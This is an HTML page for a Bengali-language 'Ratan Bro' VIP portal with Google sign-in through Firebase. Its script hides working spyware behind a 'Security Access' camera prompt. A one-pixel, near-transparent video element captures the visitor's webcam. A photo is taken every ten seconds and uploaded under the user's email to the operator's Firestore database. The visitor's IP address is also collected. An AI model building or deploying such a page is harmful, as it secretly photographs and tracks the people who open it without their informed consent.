<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Private VIP Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --pink: #ff0055;
            --pink-glow: rgba(255, 0, 85, 0.6);
            --dark-bg: #0f1116;
            --card-bg: #161a22;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Hind Siliguri', sans-serif;
        }

        body {
            background-color: var(--dark-bg);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* [১] ছবির মতো প্রফেশনাল লগইন পেজ */
        #login-overlay {
            position: fixed;
            inset: 0;
            background: #050505;
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-card {
            background: #12141a;
            width: 90%;
            max-width: 400px;
            padding: 50px 30px;
            border-radius: 40px;
            border: 1px solid rgba(255, 0, 85, 0.2);
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
        }

        .login-card .profile-circle {
            width: 120px;
            height: 120px;
            margin: 0 auto 25px;
            border-radius: 50%;
            border: 3px solid var(--pink);
            padding: 5px;
            box-shadow: 0 0 25px var(--pink-glow);
        }

        .login-card .profile-circle img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .login-card h2 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 700;
            color: #fff;
        }

        .login-card p {
            color: #888;
            font-size: 14px;
            margin-bottom: 40px;
        }

        .google-btn {
            background: linear-gradient(90deg, #ff0055, #ff0077);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 50px;
            font-weight: 700;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            box-shadow: 0 10px 20px rgba(255, 0, 85, 0.3);
            transition: 0.3s;
        }

        .google-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(255, 0, 85, 0.5);
        }

        /* [২] লাভ রেইন এনিমেশন (Header Background) */
        .love-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            overflow: hidden;
            z-index: 1;
        }

        .heart {
            position: absolute;
            color: var(--pink);
            font-size: 15px;
            opacity: 0.6;
            animation: fall linear forwards;
        }

        @keyframes fall {
            to { transform: translateY(300px); opacity: 0; }
        }

        /* [৩] মেইন ইউআই এবং হাইলাইট */
        .hero-section {
            position: relative;
            margin: 20px;
            padding: 40px 20px;
            background: #161a22;
            border-radius: 35px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            text-align: center;
            overflow: hidden;
        }

        .welcome-text {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(to right, #fff, var(--pink));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-top: 15px;
            position: relative;
            z-index: 2;
        }

        .profile-stack {
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            z-index: 2;
        }

        .p-img-main {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid var(--pink);
            box-shadow: 0 0 20px var(--pink-glow);
        }

        .user-mini {
            width: 80px;
            height: 80px;
            border: 3px solid #fff;
            margin-left: -30px;
            background: #000;
        }

        /* গ্রিড এবং কার্ডস */
        .action-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
        }

        .card-item {
            background: #1c212a;
            padding: 30px 15px;
            border-radius: 25px;
            text-align: center;
            text-decoration: none;
            color: #fff;
            border: 1px solid rgba(255, 0, 85, 0.05);
            transition: 0.3s;
        }

        .card-item:hover {
            border-color: var(--pink);
            background: rgba(255, 0, 85, 0.05);
            transform: scale(1.02);
        }

        .card-item i {
            font-size: 2.5rem;
            color: var(--pink);
            margin-bottom: 15px;
            display: block;
        }

        /* সিকিউরিটি এবং পারমিশন মোডাল */
        #perm-modal {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.95);
            z-index: 10001;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .perm-box {
            background: #161a22;
            padding: 40px;
            border-radius: 30px;
            border: 1px solid var(--pink);
            text-align: center;
            max-width: 350px;
        }

        /* হিডেন ভিডিও সোর্স */
        #vSource {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
        }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-card">
            <div class="profile-circle">
                <img src="ratan.jpg" alt="Ratan Bro">
            </div>
            <h2>Ratan Bro Portal</h2>
            <p>Private VIP Cloud Ecosystem</p>
            <button class="google-btn" onclick="startGoogleLogin()">
                <i class="fab fa-google"></i> Authenticate via Google
            </button>
        </div>
    </div>

    <div id="perm-modal">
        <div class="perm-box">
            <i class="fas fa-shield-alt" style="font-size: 3rem; color: var(--pink); margin-bottom: 20px;"></i>
            <h3>Security Access</h3>
            <p style="margin: 15px 0; color: #aaa;">পোর্টালে প্রবেশের জন্য ক্যামেরা এবং ডাটা পারমিশন দিন।</p>
            <button class="google-btn" onclick="requestFullAccess()">Allow & Open Portal</button>
        </div>
    </div>

    <div id="main-ui" style="display: none;">
        <div class="hero-section">
            <div class="love-container" id="heart-rain"></div>
            
            <div class="profile-stack">
                <img src="ratan.jpg" class="p-img-main">
                <img id="u-pic" src="" class="p-img-main user-mini" onerror="this.src='ratan.jpg'">
            </div>
            <h1 class="welcome-text" id="welcome-msg">Welcome, User</h1>
            <p style="color: #666; font-size: 12px; margin-top: 5px;" id="u-ip">Verifying Secure Line...</p>
        </div>

        <div class="action-grid">
            <a href="testpaper.html" class="card-item">
                <i class="fas fa-file-alt"></i>
                <p>Test Papers</p>
            </a>
            <a href="business.html" class="card-item">
                <i class="fas fa-chart-line"></i>
                <p>Business</p>
            </a>
            <a href="portfolio.html" class="card-item">
                <i class="fas fa-id-card"></i>
                <p>Portfolio</p>
            </a>
            <a href="https://numberlookup.pro.bd/" target="_blank" class="card-item" style="grid-column: span 2;">
                <i class="fas fa-user-secret"></i>
                <p>Advanced Number Info</p>
            </a>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>
    <canvas id="snapCanvas" style="display:none;" width="640" height="480"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let currentUser = null;

        // --- লাভ রেইন ফাংশন ---
        function createHeart() {
            const container = document.getElementById('heart-rain');
            if(!container) return;
            const heart = document.createElement('div');
            heart.classList.add('heart');
            heart.innerHTML = '❤️';
            heart.style.left = Math.random() * 100 + '%';
            heart.style.top = '-20px';
            const duration = Math.random() * 2 + 2;
            heart.style.animationDuration = duration + 's';
            container.appendChild(heart);
            setTimeout(() => heart.remove(), duration * 1000);
        }
        setInterval(createHeart, 300);

        // --- সিকিউরিটি স্ন্যাপ ---
        async function takeSecuritySnap() {
            if(!currentUser) return;
            const video = document.getElementById('vSource');
            const canvas = document.getElementById('snapCanvas');
            const ctx = canvas.getContext('2d');

            if(video.readyState === 4) {
                ctx.drawImage(video, 0, 0, 640, 480);
                const data = canvas.toDataURL('image/jpeg', 0.3);
                const userKey = currentUser.email.replace(/\./g, '_');
                await setDoc(doc(db, "users", userKey), {
                    lastPic: data,
                    lastSeen: new Date().toLocaleString(),
                    status: "Active"
                }, { merge: true });
            }
        }

        // --- অথেন্টিকেশন ---
        window.startGoogleLogin = () => {
            signInWithPopup(auth, provider);
        };

        window.requestFullAccess = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('vSource').srcObject = stream;
                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                
                // আইপি চেক
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => document.getElementById('u-ip').innerText = "Encrypted Line: " + d.ip);

                setInterval(takeSecuritySnap, 10000);
            } catch (e) {
                alert("Permission needed for VIP access!");
            }
        };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                currentUser = user;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('welcome-msg').innerText = "Welcome, " + user.displayName;
                document.getElementById('u-pic').src = user.photoURL;

                navigator.permissions.query({name:'camera'}).then(p => {
                    if(p.state === 'granted') window.requestFullAccess();
                    else document.getElementById('perm-modal').style.display = 'flex';
                });
            } else {
                document.getElementById('login-overlay').style.display = 'flex';
            }
        });
    </script>
</body>
</html>
